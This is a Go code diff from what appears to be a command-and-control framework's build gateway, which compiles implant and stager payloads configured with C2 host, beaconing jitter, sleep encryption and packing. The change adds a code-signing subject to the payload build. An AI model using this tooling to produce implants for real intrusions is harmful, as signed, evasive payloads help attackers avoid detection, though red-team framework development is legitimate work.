@@ -43,6 +43,7 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 			TLSSkipVerify bool     `json:"tls_skip_verify"`
 			SleepEncrypt  bool     `json:"sleep_encrypt"`
 			Features      []string `json:"features"`
+			SignSubject   string   `json:"sign_subject"`
 		} `json:"config"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -115,7 +116,7 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 
 	// Kick off the build in the background
 	go g.runBuild(b.ID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
-		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.TLSSkipVerify, cfg.SleepEncrypt, cfg.Features)
+		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.TLSSkipVerify, cfg.SleepEncrypt, cfg.Features, cfg.SignSubject)
 
 	writeJSON(w, http.StatusCreated, b)
 }
@@ -177,7 +178,7 @@ func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 
 // runBuild executes the Docker build in a background goroutine and updates the build record.
 func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
-	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, tlsSkipVerify, sleepEncrypt bool, features []string) {
+	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, tlsSkipVerify, sleepEncrypt bool, features []string, signSubject string) {
 
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
 	defer cancel()
@@ -269,7 +270,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
 		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
 			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-			sleepEncryptStr, payloadFeatures, campaignID, false)
+			sleepEncryptStr, payloadFeatures, campaignID, false, "")
 
 		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
 		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -321,7 +322,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, stagerFeatures, campaignID, packStager)
+		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -375,7 +376,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 	regPath, pollPath string, sleepSecs, jitterPct int,
 	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
-	packStager bool) []string {
+	packStager bool, signSubject string) []string {
 
 	packStr := "false"
 	if packStager {
@@ -400,6 +401,7 @@ func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
 		"--build-arg", "DM_FEATURES=" + features,
 		"--build-arg", "DM_PACK_STAGER=" + packStr,
+		"--build-arg", "DM_SIGN_SUBJECT=" + signSubject,
 	}
 	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
 		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
